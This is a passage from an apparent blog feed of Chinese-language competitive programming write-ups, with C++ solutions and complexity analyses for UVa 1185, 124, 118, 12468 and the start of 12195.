class="keyword">if</span>(ans[i]&gt;=m)&#123;</span><br><span class="line">			m=ans[i];</span><br><span class="line">			n=i;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=n;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans[x]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>質數篩的複雜度為 $O(NloglogN)$</p>
<p>對所有數值做質因數分解，時間複雜度約為 $O(Nlog\Omega(X))$</p>
<p>預處理答案的時間複雜度為 $O(N)$</p>
<p>每筆回答時間複雜度為 $O(1)$</p>
<p>總時間複雜度為 $O(NloglogN + Nlog\Omega(X) + O(N) + O(t))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 1185</title>
    <url>/2021/03/23/UVa1185/</url>
    <content><![CDATA[<h1 id="UVa-1185"><a href="#UVa-1185" class="headerlink" title="UVa 1185"></a>UVa 1185</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?1185" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?1185</a></p>
<p>有 $n$ 筆測資，每筆測資包含一個數字 $m$ ，求 $m!$ 是幾位數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果只給一個數字 $p$ ，要求 $p$ 是幾位數我們可以用高中學到的 $log_{10}p +1$ 的整數得到答案</p>
<p>根據 $log$ 的性質， $log_{10}{(a*b)}$ = $log_{10}{a} + log_{10}{b}$</p>
<p>在階乘計算上數字成長速度很快就會超過我們能儲存的大小，所以我們要利用前面提到的 $log$ 性質</p>
<p>要計算 $m!$ 的位數，等同於 $floor(1+\sum_{x=1}^{m}{log_{10}{x}})$</p>
<p>其中， $floor$ 表示取整數</p>
<h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code 1"></a>Code 1</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">		<span class="keyword">double</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=m ; i++)&#123;</span><br><span class="line">			ans+=<span class="built_in">log10</span>(i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;(<span class="keyword">int</span>)ans+<span class="number">1</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資都需要花 $O(m)$ 的時間計算</p>
<p>總時間複雜度 $O(nm)$</p>
<h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code 2"></a>Code 2</h2><p>我們可以將所有答案都先算起來，這樣每次詢問就可以直接回答</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">10000005</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> ans[N];</span><br><span class="line"><span class="keyword">double</span> tmp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;N ; i++)&#123;</span><br><span class="line">		tmp+=<span class="built_in">log10</span>(i);</span><br><span class="line">		ans[i]=(<span class="keyword">int</span>)tmp+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans[m]&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析-1"><a href="#時間複雜度分析-1" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>預先處理答案的時間複雜度為 $O(N)$</p>
<p>每筆詢問的時間複雜度為 $O(1)$</p>
<p>總時間複雜度為 $O(N + n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 124</title>
    <url>/2021/04/27/UVa124/</url>
    <content><![CDATA[<h1 id="UVa-124"><a href="#UVa-124" class="headerlink" title="UVa 124"></a>UVa 124</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?124" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?124</a></p>
<p>給你幾個不重複的小寫英文字母，告訴你某些字母之間的大小關係，把所有從小到大的排列列出來</p>
<p>如果沒有告知某個元素的大小關係，那可以任意擺放</p>
<h2 id="想法1"><a href="#想法1" class="headerlink" title="想法1"></a>想法1</h2><p>我們可以紀錄兩個元素之間的關係，兩兩元素間的關係可以分成 <code>a&lt;b</code> <code>a&gt;b</code> <code>未定義</code> 三種</p>
<p>只要當前枚舉的元素跟前面的元素彼此之間不衝突，也就是說並不是 <code>a&gt;b</code> 的狀態就可以枚舉下去</p>
<p>因為要找出所有情況，所以枚舉方式是採用 DFS</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> var_nums, tbl[<span class="number">26</span>];</span><br><span class="line"><span class="keyword">int</span> less_than[<span class="number">26</span>][<span class="number">26</span>]; <span class="comment">// 0: undefine, 1: less, 2: larger or others</span></span><br><span class="line"><span class="built_in">string</span> vars, cons;</span><br><span class="line"><span class="keyword">char</span> v, x, y, res[<span class="number">26</span>];</span><br><span class="line"><span class="keyword">bool</span> out=<span class="literal">false</span>, used_vars[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == var_nums)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;depth ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;res[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(tbl[i])&#123;</span><br><span class="line">			<span class="keyword">bool</span> less=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;depth ; j++)&#123;</span><br><span class="line">				<span class="comment">// 只要出現大於的情況就避開</span></span><br><span class="line">				<span class="keyword">if</span>(less_than[res[j]-<span class="string">'a'</span>][i]==<span class="number">2</span>)&#123;</span><br><span class="line">					less=<span class="literal">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(less)&#123;</span><br><span class="line">				res[depth] = i+<span class="string">'a'</span>;</span><br><span class="line">				DFS(depth+<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>, vars))&#123;</span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 初始化</span></span><br><span class="line">		var_nums=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">			tbl[i] = <span class="number">0</span>;</span><br><span class="line">			used_vars[i] = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">26</span> ; j++)&#123;</span><br><span class="line">				less_than[i][j] = <span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">stringstream</span> ss;</span><br><span class="line">		ss&lt;&lt;vars;</span><br><span class="line">		<span class="keyword">while</span>(ss&gt;&gt;v)&#123;</span><br><span class="line">			tbl[v-<span class="string">'a'</span>]++;</span><br><span class="line">			var_nums++;</span><br><span class="line">			used_vars[v-<span class="string">'a'</span>] = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 預設把所有元素之間的關係都設成未定義</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!tbl[i]) <span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">26</span> ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(!tbl[j]) <span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">if</span>(i != j)</span><br><span class="line">					less_than[i][j] = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		getline(<span class="built_in">cin</span>, cons);</span><br><span class="line">		<span class="comment">// 重設 stringstream</span></span><br><span class="line">		ss.str(<span class="string">""</span>);</span><br><span class="line">		ss.clear();</span><br><span class="line">		ss&lt;&lt;cons;</span><br><span class="line">		<span class="keyword">while</span>(ss&gt;&gt;x&gt;&gt;y)&#123;</span><br><span class="line">			less_than[x-<span class="string">'a'</span>][y-<span class="string">'a'</span>] = <span class="number">1</span>;</span><br><span class="line">			less_than[y-<span class="string">'a'</span>][x-<span class="string">'a'</span>] = <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DFS(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="想法2"><a href="#想法2" class="headerlink" title="想法2"></a>想法2</h2><p>既然題目給的是兩兩之間的關係，那麼就可以想到用一個圖來表示<br>例如題目的第一筆測資</p>
<p><img src="https://i.imgur.com/jxqzSfj.png" alt=""></p>
<p>那麼該怎麼枚舉呢?隨便選一個點走下去嗎?</p>
<p>從上圖可以發現到，因為 $G$ 跟其他點的大小關係是未定義的，所以我們永遠走不到它，所以要換個想法</p>
<p>如果當前連到點 $x$ 的線數量是 $0$ ，就表示我們可以選擇這個點</p>
<p>在選擇 $x$ 之後，我們需要把 $x$ 以及 $x$ 所能連接到的所有點的邊砍斷<br>如此一來，與 $x$ 相連的所有點在下一次都是可以枚舉的點了!</p>
<p>並且我們不會忽略那些未定義的點</p>
<p>這個方法被稱為拓樸排序，也會用到 DFS 的概念</p>
<h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> vars, cons;</span><br><span class="line"><span class="keyword">char</span> v, x, y, res[<span class="number">26</span>];</span><br><span class="line"><span class="keyword">bool</span> out=<span class="literal">false</span>, nxt[<span class="number">26</span>][<span class="number">26</span>];</span><br><span class="line"><span class="keyword">int</span> var_nums, tbl[<span class="number">26</span>], in[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == var_nums)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;depth ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;res[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(tbl[i] &amp;&amp; in[i]==<span class="number">0</span>)&#123;</span><br><span class="line">			res[depth] = i+<span class="string">'a'</span>;</span><br><span class="line">			<span class="comment">// 刪除當前以及下一層點的邊</span></span><br><span class="line">			<span class="comment">// 刪除當前是為了避免下次被重複枚舉</span></span><br><span class="line">			in[i]--;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">26</span> ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(tbl[j] &amp;&amp; nxt[i][j])&#123;</span><br><span class="line">					in[j]--;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			DFS(depth+<span class="number">1</span>);</span><br><span class="line">			in[i]++;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">26</span> ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(tbl[j] &amp;&amp; nxt[i][j])&#123;</span><br><span class="line">					in[j]++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>, vars))&#123;</span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 初始化</span></span><br><span class="line">		var_nums=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">			tbl[i] = in[i] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">26</span> ; j++)&#123;</span><br><span class="line">				nxt[i][j] = <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">stringstream</span> ss;</span><br><span class="line">		ss&lt;&lt;vars;</span><br><span class="line">		<span class="keyword">while</span>(ss&gt;&gt;v)&#123;</span><br><span class="line">			tbl[v-<span class="string">'a'</span>]=<span class="number">1</span>;</span><br><span class="line">			var_nums++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		getline(<span class="built_in">cin</span>, cons);</span><br><span class="line">		ss.str(<span class="string">""</span>);ss.clear();</span><br><span class="line">		ss&lt;&lt;cons;</span><br><span class="line">		<span class="keyword">while</span>(ss&gt;&gt;x&gt;&gt;y)&#123;</span><br><span class="line">			<span class="comment">// 連結到 y 的邊 +1</span></span><br><span class="line">			in[y-<span class="string">'a'</span>]++;</span><br><span class="line">			<span class="comment">// 記錄下邊是存在的</span></span><br><span class="line">			nxt[x-<span class="string">'a'</span>][y-<span class="string">'a'</span>] = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		DFS(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 118</title>
    <url>/2021/03/23/UVa118/</url>
    <content><![CDATA[<h1 id="UVa-118"><a href="#UVa-118" class="headerlink" title="UVa 118"></a>UVa 118</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?118" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?118</a></p>
<p>有幾個機器人在 $x \times y$ 大小的地圖裡移動</p>
<p>移動方式包含 <code>左轉</code> <code>右轉</code> <code>前進</code></p>
<p>當機器人走出地圖邊界，就會掉下去，並且在最後經過的點坐下標記</p>
<p>當其他機器人下次要走出地圖邊界，並且看到這個標記時，會自動忽略掉下去的指令</p>
<p>現在針對每一個機器人，詢問移動結束後的座標位置</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接將整個過程模擬過一遍</p>
<p>記得除了記錄現在在哪裡之外，也要記錄當前面向哪個方向</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,sx,sy,face,arr[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="keyword">char</span> c,dir[<span class="number">4</span>]=&#123;<span class="string">'N'</span>,<span class="string">'E'</span>,<span class="string">'S'</span>,<span class="string">'W'</span>&#125;;</span><br><span class="line"><span class="built_in">string</span> op;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_face</span><span class="params">(<span class="keyword">char</span> ch)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(ch==<span class="string">'N'</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">'E'</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">'S'</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;sx&gt;&gt;sy&gt;&gt;c)&#123;</span><br><span class="line">		<span class="comment">// 以數字表示方位</span></span><br><span class="line">		face=get_face(c);</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;op;</span><br><span class="line">		<span class="keyword">bool</span> lost=<span class="literal">false</span>;</span><br><span class="line">		<span class="comment">// 針對指令進行操作</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;op.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(op[i]==<span class="string">'L'</span>)&#123;</span><br><span class="line">				face--;</span><br><span class="line">				<span class="keyword">if</span>(face&lt;<span class="number">0</span>) face=<span class="number">3</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(op[i]==<span class="string">'R'</span>)&#123;</span><br><span class="line">				face++;</span><br><span class="line">				<span class="keyword">if</span>(face&gt;<span class="number">3</span>) face=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(face==<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">if</span>(sy+<span class="number">1</span>&gt;m)&#123;</span><br><span class="line">						<span class="keyword">if</span>(arr[sx][sy]==<span class="number">0</span>)&#123;</span><br><span class="line">							arr[sx][sy]=<span class="number">-1</span>;</span><br><span class="line">							lost=<span class="literal">true</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						sy++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">1</span>)&#123;</span><br><span class="line">					<span class="keyword">if</span>(sx+<span class="number">1</span>&gt;n)&#123;</span><br><span class="line">						<span class="keyword">if</span>(arr[sx][sy]==<span class="number">0</span>)&#123;</span><br><span class="line">							arr[sx][sy]=<span class="number">-1</span>;</span><br><span class="line">							lost=<span class="literal">true</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						sx++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">2</span>)&#123;</span><br><span class="line">					<span class="keyword">if</span>(sy<span class="number">-1</span>&lt;<span class="number">0</span>)&#123;</span><br><span class="line">						<span class="keyword">if</span>(arr[sx][sy]==<span class="number">0</span>)&#123;</span><br><span class="line">							arr[sx][sy]=<span class="number">-1</span>;</span><br><span class="line">							lost=<span class="literal">true</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						sy--;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">3</span>)&#123;</span><br><span class="line">					<span class="keyword">if</span>(sx<span class="number">-1</span>&lt;<span class="number">0</span>)&#123;</span><br><span class="line">						<span class="keyword">if</span>(arr[sx][sy]==<span class="number">0</span>)&#123;</span><br><span class="line">							arr[sx][sy]=<span class="number">-1</span>;</span><br><span class="line">							lost=<span class="literal">true</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						sx--;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;sx&lt;&lt;<span class="string">" "</span>&lt;&lt;sy&lt;&lt;<span class="string">" "</span>&lt;&lt;dir[face];</span><br><span class="line">		<span class="keyword">if</span>(lost)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">" LOST\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>對於每一個指令操作的時間複雜度為 $O(1)$</p>
<p>操作每個機器人的時間複雜度為 $O(len(op))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 12468</title>
    <url>/2021/03/23/UVa12468/</url>
    <content><![CDATA[<h1 id="UVa12468"><a href="#UVa12468" class="headerlink" title="UVa12468"></a>UVa12468</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?12468" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?12468</a></p>
<p>有一台電視共有 $100$ 臺頻道，由 $0$~$99$，並且是環狀的，也就是說我可以從 $0$ 轉到第 $99$，反之亦同</p>
<p>現在要從頻道 $A$ 轉到頻道 $B$，每次只能轉一臺，正向或是逆向都可，求最少的轉移數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>分別算出正著轉以及逆著轉所需的移動次數，取最小值即可</p>
<p>當我從 $0$ 轉到 $99$</p>
<ol>
<li>正轉<br> $99-0 = 99$</li>
<li>逆轉<br> $0-99+100 = 1$</li>
</ol>
<p>因為是環，所以當我轉到變成負數，只要在加上 $100$ 就可以回到應該到的位置上了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a==<span class="number">-1</span> &amp;&amp; b==<span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">int</span> forward = b-a;</span><br><span class="line">		<span class="keyword">int</span> reverse = a-b;</span><br><span class="line">		<span class="keyword">if</span>(forward&lt;<span class="number">0</span>)</span><br><span class="line">			forward+=<span class="number">100</span>;</span><br><span class="line">		<span class="keyword">if</span>(reverse&lt;<span class="number">0</span>)</span><br><span class="line">			reverse+=<span class="number">100</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;min(forward, reverse)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>每筆測資時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 12195</title>
    <url>/2021/03/23/UVa12195/</url>
    <content><![CDATA[<h1 id="UVa-12195"><a href="#UVa-12195" class="headerlink" title="UVa 12195"></a>UVa 12195</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?12195" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?12195</a></p>
<p>小李在學作曲，他想要做出每一小節長度都是 1 拍的曲子</p>
<p>可以用的音符有這些:</p>
<p><img src="https://i.imgur.com/O4PyW43.png" alt=""></p>
